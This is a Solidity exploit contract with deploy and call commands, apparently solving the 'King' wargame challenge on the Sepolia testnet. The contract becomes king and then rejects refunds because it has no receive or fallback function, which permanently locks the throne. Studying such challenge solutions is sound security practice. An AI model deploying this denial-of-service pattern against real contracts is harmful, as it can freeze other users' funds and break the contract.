// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This contract is designed to hack the King contract by becoming the king
// and then refusing to accept any further transfers of ether, effectively locking the throne.
// In order to do that, the hacking contract will not admit ether (no receive nor fallback functions).
// The contract will be funded through a payable constructor only.

// > forge create src/KingHack.sol:KingHack --rpc-url ${SEPOLIA_RPC_URL} --account updraft --value 100 --broadcast --constructor-args ${KING_INSTANCE_ADDRESS}
//
// > cast send ${KING_HACK_ADDRESS} --rpc-url ${SEPOLIA_RPC_URL} --account updraft "becomeKing()"

contract KingHack {
    address owner;
    address kingContract;

    constructor(address _kingContract) payable {
        owner = msg.sender;
        kingContract = _kingContract;
    }

    function becomeKing() public {
        require(msg.sender == owner, "Only the owner can hack!");
        (bool success,) = kingContract.call{value: address(this).balance}("");
        require(success, "Failed to become king");
    }
}
